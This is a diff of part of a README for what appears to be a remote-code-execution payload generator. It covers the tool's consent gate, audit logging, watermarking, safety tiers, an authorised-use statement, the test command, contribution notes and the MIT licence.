+- **Consent gate** — exploitation generation and `--verify-url` require `--acknowledge-consent`; `--detection-only` is benign and does not.
+- **Audit log** — every exploitation/verification run is recorded in `exploit_audit.log`. `--watermark` additionally embeds a traceable token in each payload.
+- **Safety tiers** — `safe` / `intrusive` / `stateful`, filtered by `--max-safety` (stateful and blocking probes are excluded by default).
+- **Logging** — execution logs go to `rce_generator.log`.
 
-## Ethical Use
+This toolkit is intended for authorised penetration testing, security research and
+education, and defensive training only. **Never use it against systems without
+explicit permission** — unauthorized testing is illegal.
 
-This tool is intended for:
+## Development
 
-- Penetration testing with proper authorization
-- Security research and education
-- Defensive security training
-- Security tool development
+```bash
+python -m unittest discover -s tests   # dependency-free test suite
+```
 
-**Never use this tool against systems without explicit permission.** Unauthorized testing is illegal and unethical.
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit pull requests with:
-
-- New payload categories or sinks
-- Additional encoding methods or constraint handlers
-- Bug fixes
-- Performance improvements
-- Documentation enhancements
+Contributions welcome — new sinks/categories, encodings, environments, bug fixes,
+and docs. Payload bases live in editable JSON/YAML templates
+(`templates/payloads.json`), so most coverage can be extended without touching the
+Python source.
 
 ## License
 
-This project is licensed under the MIT License - see the LICENSE file for details.
-
-## Disclaimer
-
-This tool is provided for educational and authorized testing purposes only. The developers are not responsible for any misuse or damage caused by this program.
+MIT — see [LICENSE](LICENSE).
